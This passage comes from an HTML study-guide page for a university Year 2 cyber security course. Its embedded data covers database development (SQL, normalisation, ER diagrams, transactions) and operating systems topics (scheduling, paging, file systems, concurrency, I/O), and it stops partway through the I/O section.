<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>UWS Year 2 Cyber Security — Study Guide</title>

<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#ffffff;--bg2:#f5f5f3;--bg3:#ededeb;--text:#1a1a18;--text2:#5f5e5a;--text3:#888780;--border:rgba(0,0,0,0.12);--border2:rgba(0,0,0,0.22);--radius:8px;--radius-lg:12px;}
@media(prefers-color-scheme:dark){:root{--bg:#1e1e1c;--bg2:#2a2a28;--bg3:#333331;--text:#f0efe8;--text2:#b4b2a9;--text3:#888780;--border:rgba(255,255,255,0.1);--border2:rgba(255,255,255,0.2);}}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg3);color:var(--text);min-height:100vh;padding:0}
.top-bar{background:var(--bg);border-bottom:1px solid var(--border);padding:1rem 1.5rem;position:sticky;top:0;z-index:100}
.top-bar h1{font-size:16px;font-weight:600;color:var(--text);margin-bottom:0.6rem}
.nav{display:flex;flex-wrap:wrap;gap:6px}
.nav-btn{font-size:12px;padding:5px 14px;border-radius:999px;border:1px solid var(--border2);background:var(--bg2);color:var(--text2);cursor:pointer;transition:all 0.15s;font-family:inherit}
.nav-btn:hover{background:var(--bg3)}
.nav-btn.active{background:var(--text);color:var(--bg);border-color:var(--text);font-weight:500}
.content{max-width:820px;margin:0 auto;padding:1.5rem}
.mod-header-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius-lg);padding:1.25rem 1.5rem;margin-bottom:1rem;display:flex;align-items:flex-start;gap:14px}
.mod-icon{width:44px;height:44px;border-radius:var(--radius);display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0}
.mod-title{font-size:18px;font-weight:600;color:var(--text)}
.mod-meta{font-size:13px;color:var(--text3);margin-top:3px}
.mod-desc{font-size:14px;color:var(--text2);margin-top:6px;line-height:1.6}
.assess-row{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
.assess-pill{font-size:12px;padding:4px 10px;border-radius:999px;background:var(--bg2);border:1px solid var(--border);color:var(--text2)}
.assess-pill strong{color:var(--text)}
.section-label{font-size:11px;font-weight:600;letter-spacing:0.08em;text-transform:uppercase;color:var(--text3);margin:1.25rem 0 0.6rem}
.topics-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:10px}
.topic-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius-lg);padding:1rem 1.1rem;cursor:pointer;transition:all 0.15s;display:flex;flex-direction:column;gap:6px}
.topic-card:hover{border-color:var(--border2);transform:translateY(-1px)}
.topic-num{font-size:11px;color:var(--text3);font-weight:600}
.topic-name{font-size:14px;font-weight:600;color:var(--text)}
.topic-sub{font-size:12px;color:var(--text2);line-height:1.4}
.topic-arrow{font-size:16px;color:var(--text3);align-self:flex-end;margin-top:4px}
.back-btn{display:inline-flex;align-items:center;gap:6px;font-size:13px;color:var(--text2);cursor:pointer;border:none;background:none;font-family:inherit;padding:0;margin-bottom:1rem}
.back-btn:hover{color:var(--text)}
.back-btn i{font-size:16px}
.detail-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius-lg);padding:1.5rem;margin-bottom:1rem}
.detail-header{display:flex;align-items:flex-start;gap:14px;margin-bottom:1.25rem;padding-bottom:1.25rem;border-bottom:1px solid var(--border)}
.breadcrumb{font-size:12px;color:var(--text3);margin-bottom:4px}
.detail-title{font-size:20px;font-weight:600;color:var(--text)}
.detail-overview{font-size:14px;color:var(--text2);line-height:1.7;margin-bottom:0.5rem}
.concepts{display:flex;flex-direction:column;gap:8px}
.concept{border:1px solid var(--border);border-radius:var(--radius);overflow:hidden}
.concept-head{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;cursor:pointer;background:var(--bg2)}
.concept-head:hover{background:var(--bg3)}
.concept-title{font-size:13px;font-weight:600;color:var(--text)}
.concept-body{padding:12px 14px;border-top:1px solid var(--border);background:var(--bg);font-size:13px;color:var(--text2);line-height:1.7;display:none}
.concept-body.open{display:block}
.concept-body ul,.concept-body ol{margin:6px 0 0 1.2rem}
.concept-body li{margin-bottom:4px}
.concept-body code{font-family:monospace;background:var(--bg2);padding:1px 5px;border-radius:4px;font-size:12px;color:var(--text)}
.concept-body pre{font-family:monospace;background:var(--bg2);padding:10px;border-radius:var(--radius);font-size:12px;overflow-x:auto;color:var(--text);margin-top:6px}
.timeline{display:flex;flex-direction:column;gap:0}
.tl-item{display:flex;gap:0}
.tl-left{display:flex;flex-direction:column;align-items:center;width:36px;flex-shrink:0}
.tl-dot{width:12px;height:12px;border-radius:50%;flex-shrink:0;margin-top:4px}
.tl-line{width:2px;flex:1;margin:4px 0;background:var(--border2)}
.tl-item:last-child .tl-line{display:none}
.tl-body{padding-bottom:1.25rem;flex:1}
.tl-week{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.06em;margin-bottom:4px}
.tl-task{font-size:13px;font-weight:600;color:var(--text);margin-bottom:2px}
.tl-detail{font-size:13px;color:var(--text2);line-height:1.6}
.tl-hours{display:inline-block;font-size:11px;padding:2px 8px;border-radius:999px;margin-top:4px;font-weight:500}
.practice-list{display:flex;flex-direction:column;gap:6px}
.practice-item{display:flex;gap:10px;align-items:flex-start;padding:10px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);font-size:13px;color:var(--text2);line-height:1.5}
.practice-item i{font-size:16px;color:var(--text3);flex-shrink:0;margin-top:1px}
.resource-list{display:flex;flex-direction:column;gap:6px}
.resource-item{display:flex;align-items:flex-start;gap:10px;padding:10px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius)}
.resource-item i{font-size:16px;color:var(--text3);flex-shrink:0;margin-top:1px}
.resource-name{font-size:13px;font-weight:500;color:var(--text)}
.resource-desc{font-size:12px;color:var(--text2);margin-top:2px}
footer{text-align:center;font-size:12px;color:var(--text3);padding:2rem 1rem}
</style>
</head>

<script>
const data=[
{id:"db",name:"Database Development",shortName:"Databases",icon:"ti-database",bg:"#E6F1FB",iconColor:"#185FA5",meta:"Core module · SCQF Level 8",
desc:"Covers the design, implementation and querying of relational databases. You will learn to model data using ER diagrams, write complex SQL queries, and understand how databases maintain integrity and handle concurrent access.",
assess:[{l:"Coursework",r:"SQL & design report — 50%"},{l:"Exam",r:"Written theory exam — 50%"}],
topics:[
{name:"Relational model",sub:"Tables, keys, relationships, integrity",
overview:"The relational model organises data into tables with rows and columns. Understanding keys and integrity constraints is essential for all schema design questions.",
concepts:[
{title:"Tables, rows and columns",body:"Every attribute must be atomic (one value per cell). The schema defines structure; the instance is the actual data.<ul><li>Each row represents one real-world record</li><li>All values in a column must be of the same domain/type</li></ul>"},
{title:"Primary and foreign keys",body:"<ul><li><strong>Primary key</strong> — unique, NOT NULL, identifies each row</li><li><strong>Composite key</strong> — two or more columns together</li><li><strong>Candidate key</strong> — any column(s) that could be primary key</li><li><strong>Foreign key</strong> — references primary key of another table</li></ul>"},
{title:"Referential integrity",body:"FK values must always point to an existing PK row.<ul><li><code>ON DELETE CASCADE</code> — deleting parent deletes children</li><li><code>ON DELETE SET NULL</code> — sets FK to NULL</li><li><code>ON DELETE RESTRICT</code> — prevents deletion if children exist</li></ul>"},
{title:"Constraints",body:"<ul><li><code>NOT NULL</code> — column must have a value</li><li><code>UNIQUE</code> — no duplicates</li><li><code>CHECK (age >= 18)</code> — value must satisfy condition</li><li><code>DEFAULT value</code> — fallback when none provided</li></ul>"}],
timeline:[
{week:"Week 1",color:"#185FA5",hours:"4 hrs",task:"Theory and schema design",detail:"Study tables, keys and constraints. Draw a student-course-lecturer schema identifying all key types."},
{week:"Week 2",color:"#378ADD",hours:"3 hrs",task:"Key identification practice",detail:"Given schemas, identify all candidate, primary and foreign keys. Spot referential integrity violations."},
{week:"Week 3",color:"#85B7EB",hours:"2 hrs",task:"Past exam questions",detail:"Write CREATE TABLE statements with full constraints. Explain CASCADE behaviours under exam pressure."}],
practice:["Draw a library schema (books, members, loans) with all keys","Write CREATE TABLE SQL with PK, FK, NOT NULL and CHECK constraints","Identify all candidate keys in a given staff-department table","Explain ON DELETE CASCADE vs RESTRICT with a concrete scenario"],
resources:[{name:"W3Schools SQL reference",desc:"Quick reference for SQL syntax including constraints"},{name:"Lucidchart — Database design tutorial",desc:"Free visual guide to relational modelling"},{name:"PostgreSQL docs — constraints",desc:"Authoritative reference for constraint types"}]},

{name:"SQL",sub:"SELECT, JOINs, GROUP BY, subqueries, aggregates",
overview:"SQL mastery is essential for both exams (written without a computer) and coursework. Build up from basic SELECT to complex multi-table queries.",
concepts:[
{title:"SELECT and filtering",body:"<code>SELECT cols FROM table WHERE condition ORDER BY col LIMIT n;</code><ul><li><code>DISTINCT</code> — removes duplicate rows</li><li><code>LIKE '%text%'</code> — % is wildcard, _ matches one character</li><li><code>BETWEEN x AND y</code>, <code>IN (a,b,c)</code>, <code>IS NULL</code></li><li>AND before OR — use parentheses to be safe</li></ul>"},
{title:"JOIN types",body:"<ul><li><code>INNER JOIN</code> — only matching rows in both tables</li><li><code>LEFT JOIN</code> — all left rows; NULL where no right match</li><li><code>RIGHT JOIN</code> — all right rows; NULL where no left match</li><li><code>FULL OUTER JOIN</code> — all rows; NULLs where no match</li><li><code>SELF JOIN</code> — table joined to itself (employee-manager)</li></ul>"},
{title:"GROUP BY and aggregation",body:"<ul><li><code>COUNT(*)</code>, <code>SUM(col)</code>, <code>AVG(col)</code>, <code>MIN(col)</code>, <code>MAX(col)</code></li><li><code>GROUP BY col</code> — groups before aggregating</li><li><code>HAVING condition</code> — filters groups (like WHERE but after grouping)</li><li>Order: FROM → WHERE → GROUP BY → HAVING → SELECT → ORDER BY</li></ul>"},
{title:"Subqueries and CTEs",body:"<ul><li><code>WHERE id IN (SELECT id FROM ...)</code></li><li>Correlated subquery — references outer query columns</li><li><code>EXISTS</code> — true if subquery returns any rows</li><li>CTE: <code>WITH cte AS (SELECT ...) SELECT * FROM cte</code></li></ul>"}],
timeline:[
{week:"Week 1",color:"#185FA5",hours:"5 hrs",task:"SELECT and filtering",detail:"Write 20+ SELECT queries from scratch on SQLZoo. Practice WHERE with multiple conditions."},
{week:"Week 2",color:"#378ADD",hours:"5 hrs",task:"JOINs and aggregation",detail:"Write queries using all JOIN types. Practice GROUP BY with HAVING. Know when each is appropriate."},
{week:"Week 3",color:"#85B7EB",hours:"3 hrs",task:"Subqueries and timed practice",detail:"Practice nested and correlated subqueries. Write exam queries by hand, then verify."}],
practice:["Find students not enrolled in any module using NOT EXISTS","Find average grade per module showing only modules with 10+ students","List top 3 lecturers by module count using a subquery","Write a self-join to find employees sharing the same manager"],
resources:[{name:"SQLZoo",desc:"Interactive SQL exercises with instant feedback"},{name:"LeetCode SQL problems",desc:"Database problems of increasing difficulty"},{name:"Mode SQL tutorial",desc:"Covers advanced SQL topics"}]},

{name:"Normalisation",sub:"1NF, 2NF, 3NF, BCNF and update anomalies",
overview:"Normalisation eliminates redundancy and prevents data anomalies. Exam questions ask you to decompose tables and justify each step.",
concepts:[
{title:"Why normalise? Update anomalies",body:"Unnormalised tables cause three problems:<ul><li><strong>Insert anomaly</strong> — cannot insert without unrelated data</li><li><strong>Update anomaly</strong> — one fact in many rows needs many updates</li><li><strong>Delete anomaly</strong> — deleting a row removes other useful data</li></ul>"},
{title:"1NF — First Normal Form",body:"<ul><li>All attributes atomic — no arrays or repeating groups</li><li>Each row unique — a primary key exists</li><li>Fix: move repeating groups to a separate table</li></ul>"},
{title:"2NF — Second Normal Form",body:"In 1NF plus no partial dependencies:<ul><li>Non-key attributes depend on the <em>whole</em> primary key</li><li>Only applies when primary key is composite</li><li>Example violation: OrderItem(orderID, productID, productName) — productName depends only on productID</li><li>Fix: move productName to a Product table</li></ul>"},
{title:"3NF and BCNF",body:"<strong>3NF</strong>: In 2NF plus no transitive dependencies.<ul><li>Example: Student(studentID, postcode, city) — city depends on postcode not studentID</li><li>Fix: Postcode(postcode, city) table</li></ul><strong>BCNF</strong>: Every determinant is a candidate key — stricter than 3NF."}],
timeline:[
{week:"Week 1",color:"#185FA5",hours:"3 hrs",task:"Anomalies and 1NF",detail:"Study each anomaly type with concrete examples. Spot non-atomic values."},
{week:"Week 2",color:"#378ADD",hours:"4 hrs",task:"2NF and 3NF decomposition",detail:"Decompose unnormalised tables to 3NF step by step, documenting all functional dependencies."},
{week:"Week 3",color:"#85B7EB",hours:"2 hrs",task:"BCNF and past papers",detail:"Practise explaining each decomposition step — exams ask you to justify your decisions."}],
practice:["Normalise an Order table to 3NF — show every step","Identify all functional dependencies in a given schema","Explain 2NF vs 3NF with your own invented example","Find a 3NF table that is not in BCNF and explain why"],
resources:[{name:"Studytonight — Normalisation",desc:"Clear worked examples for each normal form"},{name:"Khan Academy — Normalisation",desc:"Free video walkthrough"},{name:"Your lecturer's examples",desc:"Closest to what appears in the exam"}]},

{name:"ER diagrams",sub:"Entities, attributes, cardinality, mapping to SQL",
overview:"ER diagrams are the primary design tool before writing SQL. Exams give a scenario in prose and ask you to draw the diagram, then map it to a relational schema.",
concepts:[
{title:"Entities and attributes",body:"<ul><li><strong>Key attribute</strong> — uniquely identifies entity (underlined)</li><li><strong>Multivalued</strong> — multiple values possible (double ellipse)</li><li><strong>Derived</strong> — computed from another attribute (dashed ellipse)</li><li><strong>Weak entity</strong> — cannot be identified without a parent (double rectangle)</li></ul>"},
{title:"Relationships and cardinality",body:"<ul><li><strong>1:1</strong> — one person has one passport</li><li><strong>1:N</strong> — one department has many employees</li><li><strong>M:N</strong> — many students enrolled in many modules</li><li><strong>Total participation</strong> (double line) — every entity must participate</li><li><strong>Partial participation</strong> (single line) — may or may not participate</li></ul>"},
{title:"Mapping ER to SQL tables",body:"<ul><li>Strong entity → one table</li><li>1:N → FK on the many side</li><li>M:N → junction table with FKs to both entities</li><li>1:1 → FK on the total-participation side</li><li>Multivalued attribute → separate table with FK</li></ul>"}],
timeline:[
{week:"Week 1",color:"#185FA5",hours:"3 hrs",task:"ER notation",detail:"Draw ER diagrams for 3 real-world scenarios (hospital, library, online shop)."},
{week:"Week 2",color:"#378ADD",hours:"4 hrs",task:"Mapping to SQL",detail:"Convert ER diagrams to CREATE TABLE statements. Focus on M:N junction tables."},
{week:"Week 3",color:"#85B7EB",hours:"2 hrs",task:"Past exam questions",detail:"Practise drawing an ER diagram from a prose paragraph in under 15 minutes."}],
practice:["Draw an ER diagram for a hospital (patients, doctors, appointments, wards)","Convert an M:N ER relationship into SQL tables with a junction table","Identify all weak entities in an exam booking system","Explain total vs partial participation with a hospital example"],
resources:[{name:"draw.io / diagrams.net",desc:"Free browser-based ER diagram tool"},{name:"Lucidchart ER tutorial",desc:"Step-by-step guide with examples"},{name:"Chen vs Crow's Foot notation guide",desc:"Know which notation your module uses"}]},

{name:"Transactions",sub:"ACID properties, commit/rollback, isolation levels",
overview:"Transactions ensure database operations complete atomically even under concurrent access. ACID and isolation level trade-offs are guaranteed exam topics.",
concepts:[
{title:"ACID properties",body:"<ul><li><strong>Atomicity</strong> — all operations succeed or all roll back</li><li><strong>Consistency</strong> — DB moves from one valid state to another</li><li><strong>Isolation</strong> — concurrent transactions don't interfere</li><li><strong>Durability</strong> — committed changes survive system failures</li></ul>Classic example: a bank transfer either completes fully or is cancelled entirely."},
{title:"Commit and rollback",body:"<ul><li><code>BEGIN TRANSACTION</code> — starts a block</li><li><code>COMMIT</code> — saves changes permanently</li><li><code>ROLLBACK</code> — undoes all changes to last commit</li><li><code>SAVEPOINT name</code> — partial rollback point</li><li>Crash before COMMIT → automatic rollback on restart</li></ul>"},
{title:"Concurrency problems",body:"<ul><li><strong>Dirty read</strong> — reading uncommitted data from another transaction</li><li><strong>Non-repeatable read</strong> — same row gives different result on re-read</li><li><strong>Phantom read</strong> — re-running query returns different rows</li><li><strong>Lost update</strong> — two transactions overwrite same value; one is lost</li></ul>"},
{title:"Isolation levels",body:"Weakest to strongest:<ul><li><strong>READ UNCOMMITTED</strong> — dirty reads possible (fastest)</li><li><strong>READ COMMITTED</strong> — only reads committed data</li><li><strong>REPEATABLE READ</strong> — prevents dirty + non-repeatable reads</li><li><strong>SERIALIZABLE</strong> — fully isolated (safest, slowest)</li></ul>"}],
timeline:[
{week:"Week 1",color:"#185FA5",hours:"3 hrs",task:"ACID and transaction SQL",detail:"Write ACID properties in your own words. Write transaction blocks with COMMIT and ROLLBACK."},
{week:"Week 2",color:"#378ADD",hours:"3 hrs",task:"Isolation levels",detail:"Create a table mapping each isolation level to which anomalies it prevents — classic exam question."},
{week:"Week 3",color:"#85B7EB",hours:"2 hrs",task:"Scenario questions",detail:"For each scenario, identify which ACID property is violated and how to fix it."}],
practice:["Write a SQL transaction for a bank transfer with ROLLBACK on error","Table: which isolation level prevents each concurrency anomaly?","Which ACID property is violated if the DB crashes mid-transaction?","Describe a scenario where a dirty read causes a serious problem"],
resources:[{name:"PostgreSQL docs — transactions",desc:"Official reference"},{name:"Use The Index Luke",desc:"Practical transaction explanation"},{name:"Fireship — DB transactions (YouTube)",desc:"8-minute visual explainer"}]},

{name:"Stored procedures",sub:"Procedures, functions, triggers, views",
overview:"Stored procedures and related objects encapsulate server-side SQL logic for reuse and security. Assessed in both coursework (write one) and exams (explain when to use each).",
concepts:[
{title:"Stored procedures",body:"Named SQL block stored on the server:<ul><li>Accepts IN/OUT/INOUT parameters, supports IF/ELSE and loops</li><li>Called with EXEC or CALL</li><li>Benefits: reusable, reduced network traffic, securable independently</li></ul>"},
{title:"User-defined functions",body:"<ul><li>Scalar — returns one value; usable inside SELECT</li><li>Table-valued — returns a result set; usable in FROM clause</li><li>Cannot modify data (no side effects) in most DBMSs</li></ul>"},
{title:"Triggers",body:"Fire automatically on INSERT, UPDATE or DELETE:<ul><li>Timing: BEFORE or AFTER the event</li><li>Access to NEW and OLD row values</li><li>Uses: audit logging, enforcing complex business rules</li><li>Warning: hidden logic makes debugging harder</li></ul>"},
{title:"Views",body:"Saved SELECT acting as a virtual table:<ul><li>No data stored — re-executes on each access</li><li>Benefits: simplify complex queries, hide columns for security</li><li>Materialised view — stores results physically for performance</li></ul>"}],
timeline:[
{week:"Week 1",color:"#185FA5",hours:"3 hrs",task:"Views and procedures",detail:"Write views for complex queries. Create stored procedures accepting parameters."},
{week:"Week 2",color:"#378ADD",hours:"3 hrs",task:"Triggers and functions",detail:"Write BEFORE/AFTER triggers for audit logging. Create scalar functions used in SELECT."},
{week:"Week 3",color:"#85B7EB",hours:"2 hrs",task:"Exam practice",detail:"Write a procedure or trigger under timed conditions. Explain trigger vs constraint."}],
practice:["Create a view showing students with total credits completed","Write a stored procedure to enrol a student with validation logic","Create an AFTER INSERT trigger logging changes to an audit table","Explain the difference between a stored procedure and a function"],
resources:[{name:"PostgreSQL CREATE PROCEDURE docs",desc:"Full syntax with examples"},{name:"MySQL trigger documentation",desc:"Complete trigger reference"},{name:"Microsoft Learn — Stored Procedures",desc:"Comprehensive free tutorial"}]}
]},

{id:"os",name:"Operating Systems",shortName:"OS",icon:"ti-cpu",bg:"#EAF3DE",iconColor:"#3B6D11",meta:"Core module · SCQF Level 8",
desc:"Examines how operating systems manage CPU, memory, storage and I/O. Scheduling algorithm calculations and page replacement traces are guaranteed exam content.",
assess:[{l:"Coursework",r:"Lab reports / portfolio — 50%"},{l:"Exam",r:"Theory exam — 50%"}],
topics:[
{name:"Process management",sub:"Scheduling algorithms, process states, PCB, Gantt chart calculations",
overview:"The OS manages multiple processes sharing one CPU. Scheduling algorithm Gantt chart calculations appear in almost every exam — practise until you are fast and accurate.",
concepts:[
{title:"Five process states",body:"<ul><li><strong>New</strong> → <strong>Ready</strong> (admitted to ready queue)</li><li><strong>Ready</strong> → <strong>Running</strong> (CPU scheduler selects it)</li><li><strong>Running</strong> → <strong>Ready</strong> (preempted by scheduler)</li><li><strong>Running</strong> → <strong>Waiting</strong> (I/O or event requested)</li><li><strong>Waiting</strong> → <strong>Ready</strong> (I/O complete)</li><li><strong>Running</strong> → <strong>Terminated</strong> (process exits)</li></ul>"},
{title:"Process Control Block (PCB)",body:"Data structure holding all process info:<ul><li>PID, PPID, process state</li><li>Program counter — address of next instruction</li><li>CPU registers — saved during context switch</li><li>Memory management info — page table pointer</li><li>Open file descriptors, accounting info (CPU time, priority)</li></ul>"},
{title:"Scheduling algorithms",body:"<strong>Non-preemptive:</strong><ul><li><strong>FCFS</strong> — First Come First Served. Simple; convoy effect</li><li><strong>SJF</strong> — Shortest Job First. Optimal average wait; needs burst time knowledge</li></ul><strong>Preemptive:</strong><ul><li><strong>SRTF</strong> — Preemptive SJF</li><li><strong>Round Robin</strong> — time quantum; fair but context switch overhead</li><li><strong>Priority</strong> — starvation risk; fix with ageing</li></ul>"},
{title:"How to calculate metrics",body:"Draw the Gantt chart first, then calculate:<ul><li><strong>Turnaround time</strong> = Completion − Arrival</li><li><strong>Waiting time</strong> = Turnaround − Burst</li><li><strong>Response time</strong> = First CPU allocation − Arrival</li><li>Average = sum / number of processes</li></ul>"}],
timeline:[
{week:"Week 1",color:"#3B6D11",hours:"3 hrs",task:"States and PCB",detail:"Memorise the 5-state diagram with all transitions. List every PCB field and explain its role."},
{week:"Week 2",color:"#639922",hours:"4 hrs",task:"Scheduling calculations",detail:"Work Gantt chart calculations for all 5 algorithms with at least 5 different process sets."},
{week:"Week 3",color:"#97C459",hours:"3 hrs",task:"Timed exam practice",detail:"Scheduling calculations are guaranteed exam content — time yourself to build speed."}],
practice:["P1(0,8) P2(1,4) P3(2,9) P4(3,5) — Gantt charts for FCFS, SJF, Round Robin (q=2)","Calculate average waiting and turnaround time for each algorithm above","Draw the 5-state process diagram with all transitions and trigger conditions labelled","Explain every piece of data saved in a PCB during a context switch and why each is needed"],
resources:[{name:"Neso Academy — OS scheduling playlist",desc:"Worked examples with Gantt charts"},{name:"OS Concepts — Silberschatz Ch.3-5",desc:"The standard textbook"},{name:"os-scheduling.netlify.app",desc:"Interactive Gantt chart generator to check answers"}]},

{name:"Memory management",sub:"Paging, virtual memory, page replacement algorithms",
overview:"Paging and virtual memory allow processes to share RAM safely. Page replacement algorithm traces (FIFO, LRU, OPT) are a classic exam calculation question.",
concepts:[
{title:"Logical vs physical addressing",body:"<ul><li><strong>Logical address</strong> — generated by CPU (what the process sees)</li><li><strong>Physical address</strong> — actual RAM location</li><li>The MMU translates logical → physical at runtime</li><li>Enables processes to be relocated without their knowledge</li></ul>"},
{title:"Paging mechanics",body:"<ul><li><strong>Frame</strong> — fixed-size block of physical memory (typically 4KB)</li><li><strong>Page</strong> — fixed-size block of logical address space</li><li><strong>Page table</strong> — maps page numbers to frame numbers (one per process)</li><li>Logical address = (page number, offset). MMU looks up frame, adds offset</li><li><strong>TLB</strong> — fast cache for recent page table lookups</li></ul>"},
{title:"Virtual memory and demand paging",body:"<ul><li>Pages loaded only when accessed (demand paging)</li><li><strong>Page fault</strong> — page not in RAM; OS loads from disk</li><li><strong>Thrashing</strong> — too many faults; system only swaps, no useful work</li><li><strong>Working set</strong> — actively used pages; keep in RAM to prevent thrashing</li></ul>"},
{title:"Page replacement algorithms",body:"When RAM full and fault occurs, evict a page:<ul><li><strong>FIFO</strong> — evict oldest. Can suffer Belady's anomaly</li><li><strong>LRU</strong> — evict least recently used. Good approximation of optimal</li><li><strong>Optimal</strong> — evict page used furthest in future. Best but needs future knowledge</li><li>Trace reference strings and count faults — exam staple</li></ul>"}],
timeline:[
{week:"Week 1",color:"#3B6D11",hours:"3 hrs",task:"Paging and address translation",detail:"Draw the translation process. Practice calculating physical addresses from page tables."},
{week:"Week 2",color:"#639922",hours:"4 hrs",task:"Page replacement traces",detail:"Trace reference strings with FIFO, LRU and OPT. Count page faults per algorithm."},
{week:"Week 3",color:"#97C459",hours:"2 hrs",task:"Virtual memory theory",detail:"Understand thrashing and working set model for theory exam questions."}],
practice:["Given page table and logical address, calculate physical address","Trace 1,2,3,4,1,2,5,1,2,3,4,5 with 3 frames — FIFO and LRU fault counts","Explain why thrashing occurs and two ways to prevent it","Calculate effective memory access time: TLB hit ratio 90%, TLB access 5ns, memory 100ns"],
resources:[{name:"Neso Academy — Memory Management",desc:"Visual walkthroughs of paging and page replacement"},{name:"OS Concepts Ch.8-10 — Silberschatz",desc:"Standard textbook coverage"},{name:"Online page replacement simulator",desc:"Search for interactive tools to verify your traces"}]},

{name:"File systems",sub:"FAT, NTFS, ext4, inodes, allocation methods, journaling",
overview:"File systems manage data storage and retrieval. Inode structure, allocation methods and file system comparison are commonly examined as theory questions.",
concepts:[
{title:"Disk allocation methods",body:"<ul><li><strong>Contiguous</strong> — all blocks together. Fast sequential reads; fragmentation problem</li><li><strong>Linked</strong> — each block points to next. Easy to grow; slow random access</li><li><strong>Indexed (inode)</strong> — index block holds all data block pointers. Best balance</li></ul>"},
{title:"Inodes (Linux/ext4)",body:"Stores all file metadata except filename:<ul><li>Permissions, owner, group, size, timestamps</li><li>Block pointers: 12 direct + single + double + triple indirect</li><li><code>stat file</code> — full inode info; <code>ls -i</code> — inode number</li><li>Hard link — another directory entry to same inode</li><li>Soft link — contains path string; breaks if target moved</li></ul>"},
{title:"File systems compared",body:"<ul><li><strong>FAT32</strong> — max 4GB file, no permissions, no journaling, widely compatible</li><li><strong>NTFS</strong> — large files, ACL permissions, journaling (Windows)</li><li><strong>ext4</strong> — large files/volumes, journaling, extents (Linux standard)</li></ul>"},
{title:"Journaling",body:"Prevents corruption after a crash:<ul><li>Changes logged to journal before being applied to disk</li><li>On crash: replay journal to complete or undo incomplete operations</li><li>Without it: full fsck scan needed on recovery (very slow)</li></ul>"}],
timeline:[
{week:"Week 1",color:"#3B6D11",hours:"3 hrs",task:"Allocation methods",detail:"Draw contiguous, linked and indexed allocation across multiple disk blocks."},
{week:"Week 2",color:"#639922",hours:"3 hrs",task:"Inodes",detail:"Use stat and ls -i on your Linux VM. Calculate max file size from inode pointer structure."},
{week:"Week 3",color:"#97C459",hours:"2 hrs",task:"File system comparison",detail:"Build a comparison table of FAT32/NTFS/ext4. Explain journaling."}],
practice:["Explain how the OS locates data block 8 of a file via inode direct pointers","Calculate max file size: 12 direct + 1 single indirect (4KB blocks, 4-byte pointers)","Compare FAT32 and NTFS — when would you choose each?","What is journaling and how does it speed up recovery after a crash?"],
resources:[{name:"Linux man ext4",desc:"Technical reference"},{name:"IBM Developer — Linux file system",desc:"Clear inode explanation"},{name:"OS Concepts Ch.13-14 — Silberschatz",desc:"File system chapters"}]},

{name:"Concurrency",sub:"Threads, race conditions, semaphores, deadlock, Banker's algorithm",
overview:"Concurrency enables parallelism but requires synchronisation. The 4 Coffman conditions and Banker's algorithm are heavily assessed — expect both theory and calculation questions.",
concepts:[
{title:"Threads vs processes",body:"<ul><li><strong>Process</strong> — independent program with own memory space</li><li><strong>Thread</strong> — lightweight unit within a process, sharing memory</li><li>Threads cheaper to create and switch; shared memory enables race conditions</li></ul>"},
{title:"Race conditions and synchronisation",body:"<ul><li><strong>Race condition</strong> — result depends on thread execution order</li><li><strong>Critical section</strong> — shared data access; one thread at a time</li><li>Solutions: Mutex (binary lock), Semaphore (integer with wait/signal), Monitor (language construct)</li><li>Must satisfy: mutual exclusion, progress, bounded waiting</li></ul>"},
{title:"Deadlock — 4 Coffman conditions",body:"ALL must hold for deadlock:<ul><li><strong>Mutual exclusion</strong> — resource held by one thread only</li><li><strong>Hold and wait</strong> — holds a resource while waiting for another</li><li><strong>No preemption</strong> — resource cannot be forcibly taken</li><li><strong>Circular wait</strong> — T1 waits for T2, T2 waits for T1</li></ul>Break any one condition to prevent deadlock."},
{title:"Banker's algorithm",body:"Determines if granting a request leaves a safe state:<ul><li><strong>Safe state</strong> — a sequence exists where all threads can complete</li><li>Need matrix = Max − Allocation</li><li>Simulate allocation; if safe sequence still exists, grant request</li></ul>"}],
timeline:[
{week:"Week 1",color:"#3B6D11",hours:"3 hrs",task:"Threads and synchronisation",detail:"Write a pseudocode race condition. Study semaphore wait/signal. Solve producer-consumer."},
{week:"Week 2",color:"#639922",hours:"4 hrs",task:"Coffman conditions and deadlock",detail:"Memorise 4 conditions. Identify deadlock in resource allocation graphs."},
{week:"Week 3",color:"#97C459",hours:"3 hrs",task:"Banker's algorithm",detail:"Work Banker's algorithm examples until the process is automatic."}],
practice:["Show a race condition with 2 threads incrementing a shared counter","Solve producer-consumer problem using semaphores","Given resource allocation graph, determine if deadlock exists","Run Banker's algorithm: 3 processes, 3 resource types — find safe sequence"],
resources:[{name:"Neso Academy — Deadlock playlist",desc:"Step-by-step Banker's algorithm examples"},{name:"OS Concepts Ch.6-8 — Silberschatz",desc:"Synchronisation and deadlock chapters"},{name:"Little Book of Semaphores — Downey (free PDF)",desc:"Practical concurrency problems"}]},

{name:"I/O subsystems",sub:"Interrupts, DMA, kernel I/O layers, buffering",
overview:"The OS manages I/O through a layered abstraction. Interrupts, DMA, and the purpose of each kernel I/O layer are assessed as detailed theory questions.",
concepts:[
{title:"Polling vs interrupt-driven I/O",body:"<ul><li><strong>Polling</strong> — CPU continuously checks device status. Simple but wastes cycles</li><li><strong>Interrupt-driven</strong> — device signals CPU via interrupt when ready. CPU free during I/O</li><li><strong>Interrupt vector</strong> — maps interrupt numbers to ISR handler addresses</li></ul>"},
{title:"Direct Memory Access (DMA)",body:"<ul><li>CPU programs DMA controller with source, destination and byte count</li><li>DMA transfers directly between device and RAM — CPU is free</li><li>DMA interrupts CPU when transfer completes</li><li>Essential for high-throughput devices: NVMe, NIC, GPU</li></ul>"},
